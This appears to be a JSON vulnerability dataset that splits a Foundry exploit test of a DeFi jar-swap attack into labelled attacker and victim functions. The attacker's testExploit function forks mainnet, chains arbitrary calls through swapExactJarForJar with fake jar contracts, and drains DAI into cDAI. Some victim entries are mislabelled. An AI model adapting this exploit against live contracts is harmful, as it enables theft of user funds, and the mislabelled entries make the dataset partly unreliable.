[
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 11_303_122); // Fork mainnet at block 11303122\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "AttackContract",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        uint256 earns = 5;\n\n        address[] memory targets = new address[](earns + 2);\n        bytes[] memory datas = new bytes[](earns + 2);\n        for (uint256 i = 0; i < earns + 2; i++) {\n            targets[i] = address(CURVE_LOGIC);\n        }\n        datas[0] = arbitraryCall(STRAT, \"withdrawAll()\");\n        for (uint256 i = 0; i < earns; i++) {\n            datas[i + 1] = arbitraryCall(address(PDAI), \"earn()\");\n        }\n        datas[earns + 1] = arbitraryCall(STRAT, \"withdraw(address)\", address(CDAI));\n\n        emit log_named_decimal_uint(\"Before exploiting, Attacker cDAI Balance\", CDAI.balanceOf(address(msg.sender)), 8);\n\n        console.log(\"DAI balance on pDAI\", DAI.balanceOf(address(PDAI)));\n\n        CONTROLLER.swapExactJarForJar(address(new FakeJar(CDAI)), address(new FakeJar(CDAI)), 0, 0, targets, datas);\n\n        emit log_named_decimal_uint(\"After exploiting, Attacker cDAI Balance\", CDAI.balanceOf(address(msg.sender)), 8);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "CurveLogicLike",
    "source_type": "victim_contract",
    "function_name": "add_liquidity",
    "original_code": "    function add_liquidity(uint256[2] calldata amounts, uint256 min_mint_amount)\n        external;\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeUnderlying",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeUnderlying",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeUnderlying",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address _token) external view returns (uint256) {\n        return IStrategy(strategies[_token]).balanceOf();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "JarLike",
    "source_type": "victim_contract",
    "function_name": "earn",
    "original_code": "    function earn(address _token, uint256 _amount) public {\n        address _strategy = strategies[_token];\n        address _want = IStrategy(_strategy).want();\n        if (_want != _token) {\n            address converter = converters[_token][_want];\n            IERC20(_token).safeTransfer(converter, _amount);\n            _amount = Converter(converter).convert(_strategy);\n            IERC20(_want).safeTransfer(_strategy, _amount);\n        } else {\n            IERC20(_token).safeTransfer(_strategy, _amount);\n        }\n        IStrategy(_strategy).deposit();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(address _gauge, address _token) external {\n        uint256 _balance = IERC20(_token).balanceOf(address(this));\n        IERC20(_token).safeTransfer(address(crvLocker), _balance);\n\n        _balance = IERC20(_token).balanceOf(address(crvLocker));\n        crvLocker.execute(\n            _token,\n            0,\n            abi.encodeWithSignature(\"approve(address,uint256)\", _gauge, 0)\n        );\n        crvLocker.execute(\n            _token,\n            0,\n            abi.encodeWithSignature(\n                \"approve(address,uint256)\",\n                _gauge,\n                _balance\n            )\n        );\n        crvLocker.execute(\n            _gauge,\n            0,\n            abi.encodeWithSignature(\"deposit(uint256)\", _balance)\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "getRatio",
    "original_code": "    function getRatio() public view returns (uint256) {\n        return balance().mul(1e18).div(totalSupply());\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "token",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "FakeJar",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(address _token, uint256 _amount) public {\n        require(msg.sender == jars[_token], \"!jar\");\n        IStrategy(strategies[_token]).withdraw(_amount);\n    }\n\n    // Function to swap between jars\n",
    "description": ""
  },
  {
    "contract/interface": "ControllerLike",
    "source_type": "victim_contract",
    "function_name": "swapExactJarForJar",
    "original_code": "    function swapExactJarForJar(\n        address _fromJar, // From which Jar\n        address _toJar, // To which Jar\n        uint256 _fromJarAmount, // How much jar tokens to swap\n        uint256 _toJarMinAmount, // How much jar tokens you'd like at a minimum\n        address payable[] calldata _targets,\n        bytes[] calldata _data\n    ) external returns (uint256) {\n        require(_targets.length == _data.length, \"!length\");\n\n        // Only return last response\n        for (uint256 i = 0; i < _targets.length; i++) {\n            require(_targets[i] != address(0), \"!converter\");\n            require(approvedJarConverters[_targets[i]], \"!converter\");\n        }\n\n        address _fromJarToken = IJar(_fromJar).token();\n        address _toJarToken = IJar(_toJar).token();\n\n        // Get pTokens from msg.sender\n        IERC20(_fromJar).safeTransferFrom(\n            msg.sender,\n            address(this),\n            _fromJarAmount\n        );\n\n        // Calculate how much underlying\n        // is the amount of pTokens worth\n        uint256 _fromJarUnderlyingAmount = _fromJarAmount\n            .mul(IJar(_fromJar).getRatio())\n            .div(10**uint256(IJar(_fromJar).decimals()));\n\n        // Call 'withdrawForSwap' on Jar's current strategy if Jar\n        // doesn't have enough initial capital.\n        // This has moves the funds from the strategy to the Jar's\n        // 'earnable' amount. Enabling 'free' withdrawals\n        uint256 _fromJarAvailUnderlying = IERC20(_fromJarToken).balanceOf(\n            _fromJar\n        );\n        if (_fromJarAvailUnderlying < _fromJarUnderlyingAmount) {\n            IStrategy(strategies[_fromJarToken]).withdrawForSwap(\n                _fromJarUnderlyingAmount.sub(_fromJarAvailUnderlying)\n            );\n        }\n\n        // Withdraw from Jar\n        // Note: this is free since its still within the \"earnable\" amount\n        //       as we transferred the access\n        IERC20(_fromJar).safeApprove(_fromJar, 0);\n        IERC20(_fromJar).safeApprove(_fromJar, _fromJarAmount);\n        IJar(_fromJar).withdraw(_fromJarAmount);\n\n        // Calculate fee\n        uint256 _fromUnderlyingBalance = IERC20(_fromJarToken).balanceOf(\n            address(this)\n        );\n        uint256 _convenienceFee = _fromUnderlyingBalance.mul(convenienceFee).div(\n            convenienceFeeMax\n        );\n\n        if (_convenienceFee > 1) {\n            IERC20(_fromJarToken).safeTransfer(devfund, _convenienceFee.div(2));\n            IERC20(_fromJarToken).safeTransfer(treasury, _convenienceFee.div(2));\n        }\n\n        // Executes sequence of logic\n        for (uint256 i = 0; i < _targets.length; i++) {\n            _execute(_targets[i], _data[i]);\n        }\n\n        // Deposit into new Jar\n        uint256 _toBal = IERC20(_toJarToken).balanceOf(address(this));\n        IERC20(_toJarToken).safeApprove(_toJar, 0);\n        IERC20(_toJarToken).safeApprove(_toJar, _toBal);\n        IJar(_toJar).deposit(_toBal);\n\n        // Send Jar Tokens to user\n        uint256 _toJarBal = IJar(_toJar).balanceOf(address(this));\n        if (_toJarBal < _toJarMinAmount) {\n            revert(\"!min-jar-amount\");\n        }\n\n        IJar(_toJar).transfer(msg.sender, _toJarBal);\n\n        return _toJarBal;\n    }\n\n",
    "description": ""
  }
]